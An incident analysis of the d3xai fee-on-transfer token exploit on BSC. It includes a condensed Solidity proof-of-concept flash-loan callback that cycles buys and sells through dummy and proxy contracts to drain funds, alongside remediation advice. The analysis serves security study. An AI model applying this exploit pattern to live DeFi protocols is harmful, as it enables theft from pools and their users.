# d3xai — Tax Token Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-09 |
| **Protocol** | d3xai |
| **Chain** | BSC |
| **Loss** | ~190 BNB |
| **Attacker** | [0x4b63c0cf524f71847ea05b59f3077a224d922e8d](https://bscscan.com/address/0x4b63c0cf524f71847ea05b59f3077a224d922e8d) |
| **Attack Tx** | [0x26bcefc1...](https://bscscan.com/tx/0x26bcefc152d8cd49f4bb13a9f8a6846be887d7075bc81fa07aa8c0019bd6591f) |
| **Vulnerable Contract** | N/A (Proxy contract logic vulnerable) |
| **Root Cause** | Arbitrage arising from discrepancy between the tax logic of the fee-on-transfer token (D3XAT) and AMM price calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/d3xai_exp.sol) |

---

## 1. Vulnerability Overview

The D3XAT token of the d3xai protocol applies a tax on every transfer. The attacker borrowed USDT via a PancakeSwap V3 flash loan, then exploited the price calculation discrepancy of the fee-on-transfer token by cycling through repeated buy/sell operations across multiple dummy addresses. Combined with special routing through a Proxy contract, the attacker drained 190 BNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: mismatch between post-tax amount received and AMM price basis
// Tax is deducted on D3XAT token transfer
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 taxAmount = amount * taxRate / 100;
    uint256 actualAmount = amount - taxAmount;
    // AMM calculates price based on amount, but only actualAmount is actually received
    super._transfer(from, to, actualAmount);
}

// ✅ Remediation direction: integrate AMM with token tax logic validation
// Fee-on-transfer tokens require the AMM to recognize and handle them
// Use PancakeSwap's swapExactTokensForTokensSupportingFeeOnTransferTokens
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ PancakeSwap V3 Flash Loan (borrow large amount of USDT)
  │
  ├─[2]─▶ Deploy 27 dummy addresses (pancakeBuyers)
  │         Repeatedly swap USDT → D3XAT from each address
  │         └─ Partial D3XAT burned as tax → price inflates
  │
  ├─[3]─▶ Sell D3XAT via Proxy contract through special route
  │         └─ Receive USDT at inflated price
  │
  ├─[4]─▶ Realize additional profit through 2 proxyBuyers
  │
  └─[5]─▶ Repay flash loan + retain 190 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeV3FlashCallback(...) {
    // [1] 27 rounds: buy D3XAT from each dummy address
    for (uint256 i = 0; i < numPancakeOperRound; i++) {
        // Each dummy buyer address swaps USDT → D3XAT
        // Due to tax, actual amount received < AMM calculated amount → pool imbalance occurs
        PancakeBuyer(pancakeBuyers[i]).buy(USDT_ADDR, D3XAT, pancakeBuyers[i], amount);
    }

    // [2] Sell D3XAT from each dummy address via Proxy contract
    for (uint256 i = 0; i < numPancakeOperRound; i++) {
        // Sell D3XAT → USDT at the inflated price
        PancakeSeller(pancakeSellers[i]).sell(D3XAT, USDT_ADDR, address(this));
    }

    // [3] Realize additional profit via Proxy contract route
    for (uint256 i = 0; i < numProxyOperRound; i++) {
        ProxyBuyer(proxyBuyers[i]).buy(USDT_ADDR, D3XAT, address(this), amount2);
    }
    proxySeller.sell(D3XAT, USDT_ADDR, address(this));

    // [4] Repay flash loan including fee
    IERC20(USDT_ADDR).transfer(msg.sender, amount + fee);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Fee-on-Transfer Token Price Manipulation |
| **Attack Vector** | Flash loan + fee-on-transfer token discrepancy exploitation |
| **Impact Scope** | Protocol fund drain |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP Classification** | Price Manipulation / Token Economics |

## 6. Remediation Recommendations

1. **Fee-on-Transfer Token Compatibility**: Verify that the AMM correctly handles fee-on-transfer tokens.
2. **Limit High-Volume Trades Within a Single Block**: Add logic to detect and restrict repeated buy/sell cycles within a single block.
3. **Tax Rate Review**: Design the tax recipient address and mechanism so that the tax cannot be exploited for price manipulation.
4. **Proxy Contract Access Control**: Apply additional validation to trades routed through special Proxy contract paths.

## 7. Lessons Learned

- Fee-on-transfer tokens can cause unexpected price discrepancies when integrated with AMMs.
- Repeated trading patterns across multiple dummy addresses can bypass per-transaction-based restrictions.
- When designing fee-on-transfer tokens, economic invariants under AMM integration scenarios must be validated in advance.